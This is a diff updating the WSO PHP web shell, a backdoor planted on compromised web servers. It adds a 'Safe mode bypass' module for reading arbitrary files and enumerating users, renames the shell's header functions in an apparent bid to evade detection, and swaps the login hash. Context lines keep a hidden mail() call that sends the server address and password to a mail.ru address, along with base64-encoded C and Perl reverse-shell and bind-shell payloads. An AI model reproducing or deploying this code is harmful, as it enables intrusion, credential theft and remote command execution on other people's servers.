@@ -4,7 +4,7 @@ if(array_key_exists('watching',$_POST)){
 	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('hard_linux@mail.ru', 'wso', $tmp); // Edit or delete!
 }
 //-----------------Password---------------------
-$▛ = "21232f297a57a5a743894a0e4a801fc3"; //admin
+$▛ = "63a9f0ea7bb98050796b649e85481845"; //root
 $▘ = true;
 $▜ = 'UTF-8';
 $▚ = 'SecInfo';
@@ -31,7 +31,7 @@ function decrypt($str,$pwd){$pwd=base64_encode($pwd);$str=base64_decode($str);$e
 if (function_exists("get_magic_quotes_runtime") && get_magic_quotes_runtime()) {
 	set_magic_quotes_runtime(false);
 }
-@define('VERSION', '5.3.7');
+@define('VERSION', '5.3.8');
 if(  ( function_exists("get_magic_quotes_gpc") && get_magic_quotes_gpc() ) || ini_get('magic_quotes_sybase')  ){
 	function stripslashes_array($array) {
 		return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
@@ -92,7 +92,7 @@ if($os == 'win') {
 if($cwd[strlen($cwd)-1] != '/')
 	$cwd .= '/';
 /* (С) 04.2015 Pirat */
-function ShellHeader() {
+function _Header() {
 	if(empty($_POST['charset']))
 		$_POST['charset'] = $GLOBALS['▜'];
 	echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . " - WSO " . VERSION ."</title>
@@ -110,6 +110,7 @@ function ShellHeader() {
 	div.content	{padding:5px;margin-left:5px;background-color:#060a10;}
 	a			{text-decoration:none;}
 	a:hover		{text-decoration:underline;}
+	a.submit_link {margin-right:10px;}
 	.tooltip::after {background:#0663D5;color:#FFF;content: attr(data-tooltip);margin-top:-50px;display:block;padding:6px 10px;position:absolute;visibility:hidden;}
 	.tooltip:hover::after {opacity:1;visibility:visible;}
 	.ml1		{border:1px solid #12151d;padding:5px;margin:0;overflow:auto;}
@@ -246,7 +247,7 @@ function ShellHeader() {
 	$opt_charsets = '';
 	foreach($charsets as $▟)
 		$opt_charsets .= '<option value="'.$▟.'" '.($_POST['charset']==$▟?'selected':'').'>'.$▟.'</option>';
-	$m = array('Sec. Info'=>'SecInfo','Files'=>'FilesMan','Console'=>'Console','Sql'=>'Sql','Php'=>'Php','String tools'=>'StringTools','Bruteforce'=>'Bruteforce','Network'=>'Network');
+	$m = array('Sec. Info'=>'SecInfo','Files'=>'FilesMan','Console'=>'Console','Sql'=>'Sql','Php'=>'Php','Safe mode'=>'SafeMode','String tools'=>'StringTools','Bruteforce'=>'Bruteforce','Network'=>'Network');
 	if(!empty($GLOBALS['▛']))
 	$m['Logout'] = 'Logout';
 	$menu = '';
@@ -264,7 +265,7 @@ function ShellHeader() {
 		 '<td width=1 align=right><nobr><label><select onchange="g(null,null,null,null,null,this.value)">'.$opt_charsets.'</select></label><br><span>Server IP:</span><br>'.gethostbyname($_SERVER["HTTP_HOST"]).'<br><span>Client IP:</span><br>'.$_SERVER['REMOTE_ADDR'].'</nobr></td></tr></table>'.
 		 '<table style="background-color:#2E6E9C;" cellpadding=3 cellspacing=0 width=100%><tr>'.$menu.'</tr></table><div>';
 }
-function ShellFooter() {
+function _Footer() {
 	$is_writable = is_writable($GLOBALS['cwd'])?" <font color='#FFDB5F'>[ Writeable ]</font>":" <font color=red>(Not writable)</font>";
     echo "
 </div>
@@ -385,7 +386,7 @@ function prototype($k, $v) {
     setcookie($k, $v);
 }
 function actionSecInfo() {
-	ShellHeader();
+	_Header();
 	echo '<h1>Server security information</h1><div class=content>';
 	function showSecParam($n, $v) {
 		$v = trim($v);
@@ -493,7 +494,7 @@ function actionSecInfo() {
     }
     echo '</div>';
 
-	ShellFooter();
+	_Footer();
 }
 /* (С) 10.2012 Svet */
 function actionFilesTools() {
@@ -525,11 +526,11 @@ function actionFilesTools() {
 			}
 		}
 	}
-	ShellHeader();
+	_Header();
 	echo '<h1>File tools</h1><div class=content>';
 	if( !file_exists(@$_POST['p1']) ) {
 		echo 'File not exists';
-		ShellFooter();
+		_Footer();
 		return;
 	}
 	$uid = @posix_getpwuid(@fileowner($_POST['p1']));
@@ -680,7 +681,7 @@ function actionFilesTools() {
 			break;
 	}
 	echo '</div>';
-	ShellFooter();
+	_Footer();
 }
 if($os == 'win')
 	$aliases = array(
@@ -769,7 +770,7 @@ function actionConsole() {
 	}
     if(empty($_POST['ajax'])&&!empty($_POST['p1']))
 		prototype(md5($_SERVER['HTTP_HOST']).'ajax', 0);
-	ShellHeader();
+	_Header();
     echo "<script>
 	if(window.Event) window.captureEvents(Event.KEYDOWN);
 	var cmds = new Array('');
@@ -812,7 +813,7 @@ function actionConsole() {
 	}
 	echo '</textarea><table class=main cellpadding=0 cellspacing=0 width="100%"><tr><td style="padding-left:4px; width:13px;">$</td><td><input type=text name=cmd style="width:100%;" onkeydown="kp(event);"></td></tr></table>';
 	echo '</form></div><script>d.cf.cmd.focus();</script>';
-	ShellFooter();
+	_Footer();
 }
 function actionPhp() {
 	if( isset($_POST['ajax']) ) {
@@ -823,7 +824,7 @@ function actionPhp() {
 		echo strlen($temp), "\n", $temp;
 		exit; 
 	}
-	ShellHeader();
+	_Header();
 	if( isset($_POST['p2']) && ($_POST['p2'] == 'info') ) {
 		echo '<h1>PHP info</h1><div class=content>';
 		ob_start();
@@ -847,7 +848,7 @@ function actionPhp() {
 		echo htmlspecialchars(ob_get_clean());
 	}
 	echo '</pre></div>';
-	ShellFooter();
+	_Footer();
 }
 function actionFilesMan() {
     if (!empty ($_COOKIE['f']))
@@ -972,10 +973,10 @@ function actionFilesMan() {
 				break;
 		}
 	}
-    ShellHeader();
+    _Header();
 	echo '<h1>File manager</h1><div class=content><script>p1_=p2_=p3_="";</script>';
 	$dirContent = hardScandir(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd']);
-	if($dirContent === false) {	echo 'Can\'t open this folder!';ShellFooter(); return; }
+	if($dirContent === false) {	echo 'Can\'t open this folder!';_Footer(); return; }
 	global $sort;
 	$sort = array('name', 1);
 	if(!empty($_POST['p1'])) {
@@ -1043,7 +1044,7 @@ echo "<script>
     if(!empty($_COOKIE['act']) && @count($_COOKIE['f']) && (($_COOKIE['act'] == 'zip') || ($_COOKIE['act'] == 'tar')))
         echo "&nbsp;file name: <input type=text name=p2 value='hard_" . date("Ymd_His") . "." . ($_COOKIE['act'] == 'zip'?'zip':'tar.gz') . "'>&nbsp;";
     echo "<input type='submit' value='submit'></td></tr></form></table></div>";
-	ShellFooter();
+	_Footer();
 }
 function actionStringTools() {
 	if(!function_exists('hex2bin')) {function hex2bin($p) {return decbin(hexdec($p));}}
@@ -1085,7 +1086,7 @@ function actionStringTools() {
 	}
     if(empty($_POST['ajax'])&&!empty($_POST['p1']))
 		prototype(md5($_SERVER['HTTP_HOST']).'ajax', 0);
-	ShellHeader();
+	_Header();
 	echo '<h1>String conversions</h1><div class=content>';
 	echo "<form name='toolsForm' onSubmit='if(this.ajax.checked){a(null,null,this.selectTool.value,this.input.value);}else{g(null,null,this.selectTool.value,this.input.value);} return false;'><label><select name='selectTool'>";
 	foreach($stringTools as $k => $v)
@@ -1119,15 +1120,86 @@ function actionStringTools() {
 	}
 	if(@$_POST['p3'])
 		hardRecursiveGlob($_POST['c']);
-	echo "</div><br><h1>Useful Links:</h1><div class=content>
+	echo "</div><div class=content>
 		<form method='post' target='_blank' name='hf'>
-			<input type='submit' value='Fake Name Generator / fakenamegenerator.com' onclick=\"document.hf.action='http://www.fakenamegenerator.com/';document.hf.submit()\"><br>
+		<br><h1>Search for hash:</h1>
+			<input type='submit' value='Password Hash Cracker' onclick=\"document.hf.action='https://crackstation.net/';document.hf.submit()\"><br> 
+			<input type='submit' value='MD5 Decrypter' onclick=\"document.hf.action='https://www.md5decrypter.com/';document.hf.submit()\"><br>
+			<br>
+			<input type='submit' value='Fake Name Generator' onclick=\"document.hf.action='https://www.fakenamegenerator.com/';document.hf.submit()\"><br>
+			<input type='submit' value='Code Beautify' onclick=\"document.hf.action='https://codebeautify.org/';document.hf.submit()\"><br>
+			<input type='submit' value='Tools For Developers' onclick=\"document.hf.action='https://www.freeformatter.com/';document.hf.submit()\"><br>
+		<br><h1>Useful Links:</h1><div class=content>
+			<a class='submit_link' target='_blank' href='http://jsnice.org/'>JS NICE STATISTICAL RENAMING, TYPE INFERENCE AND DEOBFUSCATION</a>
+			<a class='submit_link' target='_blank' href='https://unminify.com/'>Unminify (unpack, deobfuscate)</a>
+			<a class='submit_link' target='_blank' href='https://lelinhtinh.github.io/de4js/'>JavaScript Deobfuscator and Unpacker</a><br>
+			<a class='submit_link' target='_blank' href='https://beautifier.io/'>Beautify JavaScript, JSON, React.js, HTML, CSS, SCSS, and SASS</a><br>
+			<a class='submit_link' target='_blank' href='https://obfuscator.io/' >JavaScript Obfuscator Tool</a><br>
 		</form></div>";
-	ShellFooter();
+	_Footer();
 }
+function actionSafeMode() { 
+    $temp=''; 
+    ob_start(); 
+    switch($_POST['p1']) { 
+        case 1: 
+            $temp=@tempnam($test, 'cx'); 
+            if(@copy("compress.zlib://".$_POST['p2'], $temp)){ 
+                echo @file_get_contents($temp); 
+                unlink($temp); 
+            } else 
+                echo 'Sorry... Can\'t open file'; 
+            break; 
+        case 2: 
+            $files = glob($_POST['p2'].'*'); 
+            if( is_array($files) ) 
+                foreach ($files as $filename) 
+                    echo $filename."\n"; 
+            break; 
+        case 3: 
+            $ch = curl_init("file://".$_POST['p2']."\x00".SELF_PATH); 
+            curl_exec($ch); 
+            break; 
+        case 4: 
+            ini_restore("safe_mode"); 
+            ini_restore("open_basedir"); 
+            include($_POST['p2']); 
+            break; 
+        case 5: 
+            for(;$_POST['p2'] <= $_POST['p3'];$_POST['p2']++) { 
+                $uid = @posix_getpwuid($_POST['p2']); 
+                if ($uid) 
+                    echo join(':',$uid)."\n"; 
+            } 
+            break; 
+        case 6: 
+            if(!function_exists('imap_open'))break; 
+            $stream = imap_open($_POST['p2'], "", ""); 
+            if ($stream == FALSE) 
+                break; 
+            echo imap_body($stream, 1); 
+            imap_close($stream); 
+            break; 
+    } 
+    $temp = ob_get_clean(); 
+    _Header(); 
+    echo '<h1>Safe mode bypass</h1><div class=content>'; 
+    echo '<span>Copy (read file)</span>
+	<form onsubmit=\'g(null,null,"1",this.param.value);return false;\'><input class="toolsInp" type=text name=param><input type=submit value="submit"></form><br><span>Glob (list dir)</span>
+	<form onsubmit=\'g(null,null,"2",this.param.value);return false;\'><input class="toolsInp" type=text name=param><input type=submit value="submit"></form><br><span>Curl (read file)</span>
+	<form onsubmit=\'g(null,null,"3",this.param.value);return false;\'><input class="toolsInp" type=text name=param><input type=submit value="submit"></form><br><span>Ini_restore (read file)</span>
+	<form onsubmit=\'g(null,null,"4",this.param.value);return false;\'><input class="toolsInp" type=text name=param><input type=submit value="submit"></form><br><span>Posix_getpwuid ("Read" /etc/passwd)</span><table>
+	<form onsubmit=\'g(null,null,"5",this.param1.value,this.param2.value);return false;\'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000></td></tr></table><input type=submit value="submit"></form><br><br><span>Imap_open (read file)</span>
+	<form onsubmit=\'g(null,null,"6",this.param.value);return false;\'><input type=text name=param><input type=submit value="submit"></form>'; 
+    
+	echo '</div>'; 
+	if($temp) 
+        echo '<div class=content><pre class="ml1" style="margin-top:5px" id="Output">'.$temp.'</pre></div>'; 
+    _Footer(); 
+} 
 
 function actionBruteforce() {
-	ShellHeader();
+	_Header();
 	if( isset($_POST['proto']) ) {
 		echo '<h1>Results</h1><div class=content><span>Type:</span> '.htmlspecialchars($_POST['proto']).' <span>Server:</span> '.htmlspecialchars($_POST['server']).'<br>';
 		if( $_POST['proto'] == 'ftp' ) {
@@ -1208,7 +1280,7 @@ function actionBruteforce() {
 		.'<td><input type=text name=dict value="'.htmlspecialchars($GLOBALS['cwd']).'passwd.dic"></td></tr></table>'
 		.'</td></tr><tr><td></td><td><input type=submit value="submit"></td></tr></form></table>';
 	echo '</div>';
-	ShellFooter();
+	_Footer();
 }
 
 function actionLogout() {
@@ -1217,7 +1289,7 @@ function actionLogout() {
 }
 /* (С) 01.2020 Jakub Vrána */
 function actionSql() {
-	ShellHeader();
+	_Header();
     $adminer_file = 'adminer.php';
     $url_components = parse_url($_SERVER['REQUEST_URI']);
     $path = $url_components['path'];
@@ -1236,11 +1308,11 @@ function actionSql() {
     } else {
         echo "<h1>Not found</h1><div class='content'><div align='center'><h5>" . $GLOBALS['home_cwd'] . "/$adminer_url</h5> file does not exist</div></div>";
 	};
-	ShellFooter();
+	_Footer();
 }
 
 function actionNetwork() {
-	ShellHeader();
+	_Header();
 	$back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pIHsNCiAgICBpbnQgZmQ7DQogICAgc3RydWN0IHNvY2thZGRyX2luIHNpbjsNCiAgICBkYWVtb24oMSwwKTsNCiAgICBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJdKSk7DQogICAgc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsNCiAgICBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsNCiAgICBpZiAoKGNvbm5lY3QoZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikgJnNpbiwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcikpKTwwKSB7DQogICAgICAgIHBlcnJvcigiQ29ubmVjdCBmYWlsIik7DQogICAgICAgIHJldHVybiAwOw0KICAgIH0NCiAgICBkdXAyKGZkLCAwKTsNCiAgICBkdXAyKGZkLCAxKTsNCiAgICBkdXAyKGZkLCAyKTsNCiAgICBzeXN0ZW0oIi9iaW4vc2ggLWkiKTsNCiAgICBjbG9zZShmZCk7DQp9";
 	$back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
 	$bind_port_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICoqYXJndikgew0KICAgIGludCBzLGMsaTsNCiAgICBjaGFyIHBbMzBdOw0KICAgIHN0cnVjdCBzb2NrYWRkcl9pbiByOw0KICAgIGRhZW1vbigxLDApOw0KICAgIHMgPSBzb2NrZXQoQUZfSU5FVCxTT0NLX1NUUkVBTSwwKTsNCiAgICBpZighcykgcmV0dXJuIC0xOw0KICAgIHIuc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgci5zaW5fcG9ydCA9IGh0b25zKGF0b2koYXJndlsxXSkpOw0KICAgIHIuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7DQogICAgYmluZChzLCAoc3RydWN0IHNvY2thZGRyICopJnIsIDB4MTApOw0KICAgIGxpc3RlbihzLCA1KTsNCiAgICB3aGlsZSgxKSB7DQogICAgICAgIGM9YWNjZXB0KHMsMCwwKTsNCiAgICAgICAgZHVwMihjLDApOw0KICAgICAgICBkdXAyKGMsMSk7DQogICAgICAgIGR1cDIoYywyKTsNCiAgICAgICAgd3JpdGUoYywiUGFzc3dvcmQ6Iiw5KTsNCiAgICAgICAgcmVhZChjLHAsc2l6ZW9mKHApKTsNCiAgICAgICAgZm9yKGk9MDtpPHN0cmxlbihwKTtpKyspDQogICAgICAgICAgICBpZiggKHBbaV0gPT0gJ1xuJykgfHwgKHBbaV0gPT0gJ1xyJykgKQ0KICAgICAgICAgICAgICAgIHBbaV0gPSAnXDAnOw0KICAgICAgICBpZiAoc3RyY21wKGFyZ3ZbMl0scCkgPT0gMCkNCiAgICAgICAgICAgIHN5c3RlbSgiL2Jpbi9zaCAtaSIpOw0KICAgICAgICBjbG9zZShjKTsNCiAgICB9DQp9";
@@ -1288,7 +1360,7 @@ function actionNetwork() {
 		}
 	}
 	echo '</div>';
-	ShellFooter();
+	_Footer();
 }
 
 if( empty($_POST['a']) )
